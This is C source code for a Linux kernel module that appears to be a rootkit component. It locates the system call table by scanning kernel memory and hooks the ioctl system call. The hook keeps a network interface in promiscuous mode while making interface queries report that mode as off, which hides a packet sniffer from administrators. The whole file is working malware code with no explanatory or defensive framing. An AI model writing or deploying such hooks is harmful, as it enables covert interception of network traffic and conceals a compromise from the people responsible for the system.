#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/if.h>
#include <linux/syscalls.h>

MODULE_LICENSE ("GPL");

int (*orig_ioctl)(int, int, unsigned long);

unsigned long* sys_call_table;

static int promisc = 0;

void find_sys_call_table(void)
{
  int i;
  unsigned long *ptr;
  unsigned long arr[4];
  ptr = (unsigned long *)((init_mm.end_code + 4) & 0xfffffffc);
  while ((unsigned long)ptr < (unsigned long)init_mm.end_data) {
    if (*ptr == (unsigned long)((unsigned long *)sys_close)) {
      for (i = 0; i < 4; i++) {
	arr[i] = *(ptr + i);
	arr[i] = (arr[i] >> 16) & 0x0000ffff;
      }
      if (arr[0] != arr[2] || arr[1] != arr[3]) {
        sys_call_table = (ptr - __NR_close);
        break;
      }
    }
    ptr++;
  }
}


int new_ioctl(int fd, int request, unsigned long arg)
{
  int reset = 0;
  int ret;
  struct ifreq *ifr;

  ifr = (struct ifreq *)arg;

  if (request == SIOCSIFFLAGS) {
    if (ifr->ifr_flags & IFF_PROMISC) {
      promisc = 1;
    } else {
      promisc = 0;
      ifr->ifr_flags |= IFF_PROMISC;
      reset = 1;
    }
  }

  ret = (*orig_ioctl)(fd, request, arg);
  if (reset) {
    ifr->ifr_flags &= ~IFF_PROMISC;
  }
  if (ret < 0) return ret;

  if (request == SIOCGIFFLAGS) {
    if (promisc)
      ifr->ifr_flags |= IFF_PROMISC;
    else
      ifr->ifr_flags &= ~IFF_PROMISC;
  }

  return ret;
}


int init_module(void)
{
  find_sys_call_table();
  orig_ioctl = (void *)sys_call_table[__NR_ioctl];
  sys_call_table[__NR_ioctl] = (unsigned long)new_ioctl;
  return 0;
}


void cleanup_module(void)
{
  sys_call_table[__NR_ioctl] = (unsigned long)orig_ioctl;
}
